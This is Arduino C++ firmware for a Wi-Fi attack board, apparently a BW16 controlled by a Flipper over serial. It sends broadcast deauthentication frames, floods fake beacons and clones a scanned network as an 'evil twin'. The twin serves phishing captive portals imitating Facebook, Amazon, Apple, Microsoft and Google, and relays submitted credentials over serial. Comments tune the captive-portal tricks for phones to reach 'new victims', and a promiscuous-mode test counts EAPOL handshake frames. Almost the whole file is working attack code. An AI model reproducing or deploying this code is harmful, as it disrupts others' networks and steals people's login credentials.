#include "vector"
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_drv.h"
#include "debug.h"
#include "WiFi.h"

//Captive portals
#include "portals/compressed/facebook.h"
#include "portals/compressed/amazon.h"
#include "portals/compressed/apple.h"
#include "portals/compressed/microsoft.h"
#include "portals/compressed/google.h"
#include "portals/default.h"

enum portals{
  Default,
  Facebook,
  Amazon,
  Apple,
  Microsoft,
  Google
};


//DNS

#include "dns.h"
#include "dhcp_captive.h"
#include <lwip/lwip_v2.0.2/src/include/lwip/priv/tcp_priv.h>

// Stop the SDK's built-in DHCP server (in lib_arduino.a) so our option-114 server
// can own UDP:67. Declared here to avoid pulling the whole dhcps.h.
extern "C" void dhcps_deinit(void);

#define MIN(a, b) ((a) < (b) ? (a) : (b))

#define BAUD 115200

//PORTALS




typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
  int security;
} WiFiScanResult;


const char* rick_roll[8] = {
      "01 Never gonna give you up",
      "02 Never gonna let you down",
      "03 Never gonna run around",
      "04 and desert you",
      "05 Never gonna make you cry",
      "06 Never gonna say goodbye",
      "07 Never gonna tell a lie",
      "08 and hurt you"
};


std::vector<WiFiScanResult> scan_results;
std::vector<int> deauth_wifis, wifis_temp;
//WiFiServer server(80);
uint8_t deauth_bssid[6];
uint16_t deauth_reason = 2;
bool randomSSID, rickroll;
char randomString[19];
int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 149, 153, 157, 161};
int portal=0;
int localPortNew=1000;
char wpa_pass[64];
char ap_channel[4];
bool secured=false;
//"00:E0:4C:01:02:03"
__u8 customMac[8]={0x00,0xE0,0x4C,0x01,0x02,0x03,0x00,0x00};
bool useCustomMac=false;
//int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
extern u8 rtw_get_band_type(void);
#define FRAMES_PER_DEAUTH 5
String generateRandomString(int len){
  String randstr = "";
  const char setchar[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (int i = 0; i < len; i++){
    int index = random(0,strlen(setchar));
    randstr += setchar[index];

  }
  return randstr;
}

String parseRequest(String request) {
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  return request.substring(path_start, path_end);
}

//DNS
bool apActive = false;


int status = WL_IDLE_STATUS;   

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    if(result.ssid.length()==0)result.ssid = String("<empty>");
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    result.security = record->security;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}
WiFiServer server(80);
bool serveBegined =false;


void createAP(char* ssid, char* channel, char* password){
  int mode;
  const char* ifname = WLAN0_NAME;
  wext_get_mode(ifname, &mode);

  Serial.print("WLAN 0 ");
  Serial.println(mode);

  ifname = WLAN1_NAME;
  wext_get_mode(ifname, &mode);
  Serial.print("WLAN 1 ");
  Serial.println(mode);


  DEBUG_SER_PRINT("CREATING AP");
  DEBUG_SER_PRINT(ssid);
  DEBUG_SER_PRINT(channel);
  while (status != WL_CONNECTED) {
    DEBUG_SER_PRINT("CREATING AP 2");
      if(strcmp(password,"")==0){
        status = WiFi.apbegin(ssid, channel, (uint8_t) 0);
      }else{
        status = WiFi.apbegin(ssid, password, channel, (uint8_t) 0);
      }
      delay(1000);
  }
  // Replace the SDK DHCP server with ours so we can advertise option 114 (RFC 8910),
  // which is what actually triggers Android 11+ captive-portal auto-open.
  dhcps_deinit();
  start_DHCP_Server();

  unbind_dns();
  delay(1000);

  //Creamos un nuevo servicio de dns
  start_DNS_Server();
  if(!serveBegined){
    server.begin();
    serveBegined=true;
  }
  apActive = true;
  ifname = WLAN0_NAME;
  wext_get_mode(ifname, &mode);

  Serial.print("WLAN 0 ");
  Serial.println(mode);

  ifname = WLAN1_NAME;
  wext_get_mode(ifname, &mode);
  Serial.print("WLAN 1 ");
  Serial.println(mode);
}
void createAP(char* ssid, char* channel){

  createAP(ssid, channel, "");
}
void destroyAP(){
  //udp_remove(dns_server_pcb);
  
  void unbind_all_udp();
  delay(500);
  WiFiClient client = server.available();
  while(client.connected()){
    DEBUG_SER_PRINT("PArando cliente");
    DEBUG_SER_PRINT(client);
    client.flush();
    client.stop();
    client = server.available();
  }
  apActive=false;
  delay(500);
  wifi_off();
  delay(500);
  WiFiDrv::wifiDriverInit();
  wifi_on(RTW_MODE_STA_AP);
  status = WL_IDLE_STATUS;   
  delay(500);
  WiFi.enableConcurrent();

  WiFi.status();
  int channel;
  wifi_get_channel(&channel);



}


String makeResponse(int code, String content_type, bool compresed, size_t content_length) {
  // Well-formed HTTP is required: Android/iOS captive detection ignores malformed
  // responses (bare LF, no Content-Length). CRLF + Content-Length mirrors stock 5Ghost.
  const char *reason = (code == 302) ? "Found" : (code == 404) ? "Not Found" : "OK";
  String response = "HTTP/1.1 " + String(code) + " " + reason + "\r\n";
  if(compresed)
  response += "Content-Encoding: gzip\r\n";
  response += "Content-Type: " + content_type + "\r\n";
  response += "Content-Length: " + String(content_length) + "\r\n";
  response += "Cache-Control: no-store\r\n";
  response += "Connection: close\r\n\r\n";
  return response;
}

// 302 to the portal root — this is what makes Android's generate_204 / iOS probes fire the
// "Sign in to network" flow. Stock 5Ghost uses exactly this; DHCP option 114 is NOT needed.
void handleRedirect(WiFiClient &client) {
  String response = "HTTP/1.1 302 Found\r\n";
  response += "Location: http://192.168.4.1/\r\n";
  response += "Content-Length: 0\r\n";
  response += "Cache-Control: no-store\r\n";
  response += "Connection: close\r\n\r\n";
  client.write(response.c_str());
}

// Per-client captive state: once a client submits the portal form it's "authorized",
// and we answer ITS OS connectivity probes with 204 (No Content) so the
// "Connected, no internet" warning clears. Un-authorized clients still get a 302 to
// the portal, so it keeps popping for new victims. Peer IP via WiFiClient::remoteIP()
// (core patch -> lwip_getpeername).
static uint32_t authed_ips[16];
static uint8_t authed_n = 0;
bool ip_is_authed(uint32_t ip) { for (uint8_t i = 0; i < authed_n; i++) if (authed_ips[i] == ip) return true; return false; }
void ip_mark_authed(uint32_t ip) { if (ip && !ip_is_authed(ip)) { authed_ips[authed_n % 16] = ip; if (authed_n < 16) authed_n++; } }

void handle204(WiFiClient &client) {
  // 204 = probe succeeded -> OS marks the network validated and drops the warning.
  client.write("HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nCache-Control: no-store\r\nConnection: close\r\n\r\n");
}

void handle404(WiFiClient &client) {
  String body = "Not found!";
  String response = makeResponse(404, "text/plain", false, body.length());
  response += body;
  client.write(response.c_str());
}


void handleRequest(WiFiClient &client,enum portals portalType,String ssid){
  const char *webPage;
  size_t len;
  bool compresed = false;
  switch(portalType){
    case Default:
      webPage = default_web(ssid);
      len = strlen(webPage);
      break;
    case Facebook:
      webPage = (const char*)facebook;
      len = facebook_len;
      break;
    case Amazon:
      webPage = (const char*)amazon;
      len = amazon_len;
      break;
    case Apple:
      webPage = (const char *)apple;
      len = apple_len;
      break;
    case Google:
      webPage = (const char *)google;
      len = google_len;
      break;
    case Microsoft:
      webPage = (const char *)microsoft;
      len = microsoft_len;
      break;
    default:
      webPage = default_web(ssid);
  }
  Serial.print("Heap libre header:");
  Serial.println(xPortGetFreeHeapSize());
  if(webPage[0]==0x1f && webPage[1]==0x8b){
    compresed=true;
  }
  
  String response = makeResponse(200, "text/html", compresed, len);
  client.write(response.c_str());
  
   

  size_t chunkSize = 5000;

  for (size_t i = 0; i < len; i += chunkSize) {
        size_t sendSize = MIN(chunkSize, len - i);
        while(client.available()){
            client.read();
            delay(10);
            }
            Serial.print("Heap libre write:");
        Serial.println(xPortGetFreeHeapSize());
        if(client.connected()){
          client.write((const uint8_t *)(webPage + i), sendSize);
          if(client.getWriteError())return;
        }else{
          return;
        }
        delay(1);
  }

  delay(10);
   while(client.available()){
            client.read();
            delay(1);
            }
}

int scanNetworks(int miliseconds) {
  DEBUG_SER_PRINT("Scanning WiFi networks ("+(String)miliseconds+" ms)...\n");
  scan_results.clear();
  DEBUG_SER_PRINT("wifi get band type:"+(String)wifi_get_band_type()+"\n");
  DEBUG_SER_PRINT("scan results cleared...");
  
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    digitalWrite(LED_B,false);
    for (int i =0;i<miliseconds/100;i++){
      digitalWrite(LED_G, !digitalRead(LED_G));
      delay(100);

    }
    digitalWrite(LED_B,true);
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}
String readString;

void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  
  Serial.begin(BAUD);
  Serial1.begin(BAUD);
  readString.reserve(50);
  DEBUG_SER_PRINT("Iniciando\n");
  
  WiFi.enableConcurrent();
  WiFi.status();
  int channel;
  wifi_get_channel(&channel);

  digitalWrite(LED_B, HIGH);
}
String ssid="";
uint32_t current_num = 0;

// --- Promisc spike (GATE test): does the BW16 driver actually deliver data/EAPOL
// frames to the promisc callback, or only mgmt? If data+EAPOL flow, handshake/PMKID/
// station-enum ports are feasible; if not, they're off the table. RTW_PROMISC_ENABLE
// + len_used=1 delivers Ethernet frames, so EAPOL shows up as ethertype 0x888e. ---
static volatile uint32_t pm_total = 0, pm_mgmt = 0, pm_ctrl = 0, pm_data = 0, pm_eapol = 0;
// RTW_PROMISC_ENABLE_2 (raw 802.11): buf[0] = frame control. type bits (buf[0]>>2)&3:
// 0=mgmt 1=ctrl 2=data. EAPOL rides in a data frame after the 802.11 hdr + LLC/SNAP,
// ethertype 0x888e at offset 30 (non-QoS) or 32 (QoS data).
static void promisc_spike_cb(unsigned char *buf, unsigned int len, void *userdata) {
  (void)userdata;
  if (len < 1) return;
  pm_total++;
  uint8_t ftype = (buf[0] >> 2) & 0x3;
  if (ftype == 0) pm_mgmt++;
  else if (ftype == 1) pm_ctrl++;
  else if (ftype == 2) {
    pm_data++;
    if ((len >= 32 && buf[30] == 0x88 && buf[31] == 0x8e) ||
        (len >= 34 && buf[32] == 0x88 && buf[33] == 0x8e)) pm_eapol++;
  }
}

void loop() {
  while (Serial1.available()) {
    delay(3);  //delay to allow buffer to fill
    if (Serial1.available() >0) {
      char c = Serial1.read();  //gets one byte from serial buffer
      readString += c; //makes the string readString
    }
  }
  // Also accept the same commands over USB (Serial/CH340) so the board can be driven
  // from a host for testing without the Flipper attached. Same readString pipeline.
  while (Serial.available()) {
    delay(3);
    if (Serial.available() > 0) {
      readString += (char)Serial.read();
    }
  }
  if(readString.length()>0){
    if(readString.substring(0,4)=="SCAN"){
      if(apActive)
        destroyAP();
      deauth_wifis.clear();
      DEBUG_SER_PRINT("Stop randomSSID\n");
      randomSSID = false;
      rickroll=false;
      ssid="";

      while (scanNetworks(5000)){
        delay(1000);
      }
      Serial1.print("SCAN:OK\n");
      Serial.print("SCAN:OK\n");
      
    }else if(readString.substring(0,4)=="STOP"){
      DEBUG_SER_PRINT("Stop deauthing\n");
      
      secured = false;
      strcpy(wpa_pass,"");
      if(readString.length()>5 && !apActive){
        unsigned int numStation = readString.substring(5,readString.length()-1).toInt();
        if(numStation < scan_results.size()){
          wifis_temp.clear();
          unsigned int num_st_tmp;
          
          for(unsigned int i=0; i<deauth_wifis.size(); i++){
            num_st_tmp=deauth_wifis[i];
            if(num_st_tmp != numStation){
              wifis_temp.push_back(num_st_tmp);
            }
          }
          deauth_wifis.clear();
          for(unsigned int i=0; i<wifis_temp.size(); i++){
            num_st_tmp=wifis_temp[i];
            deauth_wifis.push_back(num_st_tmp);
          }
        }
      }else{
        destroyAP();
        deauth_wifis.clear();
        DEBUG_SER_PRINT("Stop randomSSID\n");
        randomSSID = false;
        rickroll=false;
        ssid="";
      }
      digitalWrite(LED_G, 0);
       
    }else if(readString.substring(0,6)=="RANDOM"){
      DEBUG_SER_PRINT("Start randomSSID\n");
      randomSSID = true;
        
    }else if(readString.substring(0,5)=="BSSID"){
      
      ssid = readString.substring(6,readString.length()-1);
      DEBUG_SER_PRINT("Starting BSSID "+ssid+"\n");
       
    }else if(readString.substring(0,7)=="APSTART"){
      char ssid[33];  // o el tamaño que necesites
      
      String ap_ssid = readString.substring(8,readString.length()-1);
      ap_ssid.toCharArray(ssid, 33);
      if(secured){
        createAP(ssid, ap_channel,wpa_pass);
      }else{
        createAP(ssid,ap_channel);
      }
      DEBUG_SER_PRINT("Starting BSSID "+ap_ssid+"\n");
        if(!serveBegined){
          server.begin();
          serveBegined=true;
        }
        apActive = true;

    }else if(readString.substring(0,8)=="RICKROLL"){
      
      rickroll =true;
      DEBUG_SER_PRINT("Starting BSSID "+ssid+"\n");
       
    }else if(readString.substring(0,6)=="PORTAL"){
      portal = readString.substring(7,readString.length()-1).toInt();
       
    }else if(readString.substring(0,6)=="REASON"){
      deauth_reason = readString.substring(7,readString.length()-1).toInt();
       
    }else if(readString.substring(0,8)=="PASSWORD"){
      String password;
      password = readString.substring(9,readString.length()-1).c_str();
      password.toCharArray(wpa_pass, 64);
      Serial.println(password);
      Serial.println(wpa_pass);
      secured=true;

      
    
    }else if(readString.substring(0,7)=="CHANNEL"){
    readString.substring(8,readString.length()-1).toCharArray(ap_channel,4);


    }else if(readString.substring(0,5)=="APMAC"){
      String mac;
      mac = readString.substring(6,readString.length()-1);
      //wifi_disconnect();
      DEBUG_SER_PRINT("APMAC "+mac+"\n");
      if(mac.length()==17){
        useCustomMac=true;
        
        char macStr[18]; 
        mac.toCharArray(macStr, sizeof(macStr)); 

        char *token = strtok(macStr, ":");
        int i = 0;

        while (token != NULL && i < 6) {
            customMac[i] = strtoul(token, NULL, 16);
            token = strtok(NULL, ":");
            i++;
        }
        


        Serial.print("MAC en bytes: ");
        for (int i = 0; i < 6; i++) {
            if (customMac[i] < 0x10) Serial.print("0"); 
            Serial.print(customMac[i], HEX);
            if (i < 7) Serial.print(":");
        }
        Serial.println();
        mac.replace(":","");
        int ret = wifi_change_mac_address_from_ram(1,customMac);
        if(ret==RTW_ERROR){
          Serial1.println("ERROR:Bad Mac");
          Serial.println("ERROR:Bad Mac");
        }
      }else{
        useCustomMac=false;
      }
       
    }else if(readString.substring(0,6)=="DEAUTH" || readString.substring(0,4)=="EVIL"){
      int numStation;
      if(readString.substring(0,4)=="EVIL"){
        numStation = readString.substring(5,readString.length()-1).toInt();
      }else{
        numStation = readString.substring(7,readString.length()-1).toInt();
      }
      if(numStation < (int)scan_results.size()&&numStation >=0){
        DEBUG_SER_PRINT("Deauthing "+(String)numStation+"\n");
        deauth_wifis.push_back(numStation);
        DEBUG_SER_PRINT("Deauthing "+scan_results[numStation].ssid+"\n");
        if(readString.substring(0,4)=="EVIL"){
          int str_len = scan_results[numStation].ssid.length() + 1; 

          // Prepare the character array (the buffer) 
          char char_array[str_len];

          // Copy it over 
          scan_results[numStation].ssid.toCharArray(char_array, str_len);
          char buffer[4];  // Suficiente para "123\0"
          itoa(scan_results[numStation].channel, buffer, 10);
          if(str_len>1)
            createAP(char_array, buffer);
          else
            Serial1.print("ERROR: BAD SSID, please try to rescan again");
        }
      

      }else{
        DEBUG_SER_PRINT("Wrong AP");
      }
      

    }else if(readString.substring(0,4)=="PING"){
      
      Serial.print("PONG\n");
      Serial1.print("PONG\n");
      
    }else if(readString.substring(0,4)=="LIST"){
      
      for (uint i = 0; i < scan_results.size(); i++) {
        Serial.print("AP:"+String(i)+"|");
        Serial.print(scan_results[i].ssid + "|");
        Serial1.print("AP:"+String(i)+"|");
        Serial1.print(scan_results[i].ssid + "|");
        for (int j = 0; j < 6; j++) {
          if (j > 0){
             Serial.print(":");
             Serial1.print(":");
          }
          Serial.print(scan_results[i].bssid[j], HEX);
          Serial1.print(scan_results[i].bssid[j], HEX);
          
        }
        Serial.print("|" + String(scan_results[i].channel) + "|");
        Serial.print(String(scan_results[i].security) + "|");
        Serial.print(String(scan_results[i].rssi) + "\n");
        Serial1.print("|" + String(scan_results[i].channel) + "|");
        Serial1.print(String(scan_results[i].security) + "|");
        Serial1.print(String(scan_results[i].rssi) + "\n");
      }

    }else if(readString.substring(0,11)=="PROMISCTEST"){
      // GATE experiment: set channel, capture Ethernet frames for 10s, report counts.
      int ch = readString.substring(12, readString.length()-1).toInt();
      if(ch < 1 || ch > 165) ch = 6;
      pm_total=0; pm_mgmt=0; pm_ctrl=0; pm_data=0; pm_eapol=0;
      wext_set_channel(WLAN0_NAME, ch);
      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_spike_cb, 0);
      for(int i=0;i<10;i++) delay(1000);
      wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
      String r = "PROMISC: ch="+String(ch)+" total="+String((unsigned)pm_total)+
                 " mgmt="+String((unsigned)pm_mgmt)+" ctrl="+String((unsigned)pm_ctrl)+
                 " data="+String((unsigned)pm_data)+" eapol="+String((unsigned)pm_eapol);
      Serial.println(r); Serial1.println(r);
    }
    readString="";

  }
  
  if (deauth_wifis.size() > 0) {
    memcpy(deauth_bssid, scan_results[deauth_wifis[current_num]].bssid, 6);
    wext_set_channel(WLAN0_NAME, scan_results[deauth_wifis[current_num]].channel);
    current_num++;
    if (current_num >= deauth_wifis.size()) current_num = 0;
    digitalWrite(LED_R, HIGH);
    for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      delay(5);
    }
    digitalWrite(LED_R, LOW);
    delay(50);
  }

  if (randomSSID){
    digitalWrite(LED_G, !digitalRead(LED_G));
    int randomIndex = random(0, 10);
    int randomChannel = allChannels[randomIndex];
    String ssid2 = generateRandomString(10);
    for(int i=0;i<6;i++){
      byte randomByte = random(0x00, 0xFF);
      snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
    }
    
    const char * ssid_cstr2 = ssid2.c_str();
    wext_set_channel(WLAN0_NAME,randomChannel);
    for(int x=0;x<5;x++){
      wifi_tx_beacon_frame(randomString,(void *)"\xFF\xFF\xFF\xFF\xFF\xFF",ssid_cstr2);
    }
  }
  if (rickroll){
    digitalWrite(LED_G, !digitalRead(LED_G));
    for (int v; v < 8; v++){
      String ssid2 = rick_roll[v];
      for(int i=0;i<7;i++){
        byte randomByte = random(0x00, 0xFF);
        snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
      } 
    
      const char * ssid_cstr2 = ssid2.c_str();
      wext_set_channel(WLAN0_NAME,v+1);
      for(int x=0;x<5;x++){
       wifi_tx_beacon_frame(randomString,(void *)"\xFF\xFF\xFF\xFF\xFF\xFF",ssid_cstr2);
      }
    }
  }
  if(ssid!=""){
    int channel = 5;
    digitalWrite(LED_G, !digitalRead(LED_G));
    wext_set_channel(WLAN0_NAME,channel);
    const char * ssid_cstr2 = ssid.c_str();
    for(int x=0; x<5; x++){
      DEBUG_SER_PRINT("START "+ssid);
      wifi_tx_beacon_frame((void *)"\x00\xE0\x4C\x01\x02\x03",(void *)"\xFF\xFF\xFF\xFF\xFF\xFF",ssid_cstr2);
    }

  }
  
  if (apActive) {
    WiFiClient client = server.available();
    if (client) {
      //client.setRecvTimeout(500);
      String request;
      request.reserve(256);  // Reservamos memoria para evitar fragmentación
      /*
      struct tcp_pcb *tcp;
      for (tcp = tcp_tw_pcbs; tcp != NULL; tcp = tcp->next) {
        if (tcp->local_port == 80) tcp->local_port = localPortNew++;
        tcp_close(tcp);
      }
      */

      while (client.connected()) {
        if (client.available()) {
          char character = client.read();
          if (character == '\n') {
            while(client.available()){
            character=client.read();
            client.clearWriteError();
            
            delay(1);
            }
            String path = parseRequest(request);
            Serial.println(request);
            uint32_t cip = (uint32_t)client.remoteIP();
            bool authed = ip_is_authed(cip);
            Serial.print("CIP="); Serial.print(cip, HEX); Serial.print(" authed="); Serial.println(authed);
            // RFC 8908 Captive-Portal API endpoint that DHCP option 114 points at.
            // Android's NetworkMonitor fetches this expecting application/captive+json.
            // Report captive:false once this client is authorized so the OS clears the warning.
            if(path.startsWith("/cp.json")){
              String j = String("{\"captive\":") + (authed ? "false" : "true") + ",\"user-portal-url\":\"http://192.168.4.1/\"}";
              String resp = makeResponse(200, "application/captive+json", false, j.length());
              resp += j;
              client.write(resp.c_str());
            }else
            // Portal page + form submissions get the HTML; every captive probe
            // (generate_204, ncsi.txt, success.html, …) and any unknown URL gets a
            // 302 to the portal root, which is what triggers the Android/iOS sign-in flow.
            if(path.equals("/")||path.startsWith("/?")||path.startsWith("/login")||path.startsWith("/get")||path.startsWith("/userinput")){
              if (deauth_wifis.size() != 0)
                handleRequest(client, (enum portals)portal, scan_results[deauth_wifis[0]].ssid);
              else
                handleRequest(client, (enum portals)portal, "router");
              if (path.indexOf('?') >= 0 && (path.indexOf('=') > path.indexOf('?'))) {
                String datos = path.substring(path.indexOf('?') + 1);
                if (datos.length() > 0) {
                  Serial1.print("EV:");
                  Serial1.println(datos);
                  ip_mark_authed(cip);   // creds captured -> clear this client's no-internet warning
                }
              }
          }else{
            // Probe / unknown URL: authorized client -> 204 (clears warning); else 302 to portal.
            if(authed) handle204(client); else handleRedirect(client);
          }
          break;

          }else if(character == '%'){
            char buff[2] ;
            client.read(buff,2);
            char value = (char)strtol(buff, NULL, 16);
            if(value <= 127){
              character = value;
            }else{
              request += "%";
              request += buff[0];
              request += buff[1];
            }

          } 
          request += character;

          
          delay(10);
        }
      }
      

      // Opcional: forzar limpieza de conexiones TIME-WAIT (solo si es necesario)
      /*
      struct tcp_pcb *tcp;
      for (tcp = tcp_tw_pcbs; tcp != NULL; tcp = tcp->next) {
        if (tcp->local_port == 80) tcp->local_port = localPortNew++;
        tcp_close(tcp);
      }
      */

      

      delay(50);  // menor delay, no saturar
      client.stop();

    }
  }
  
}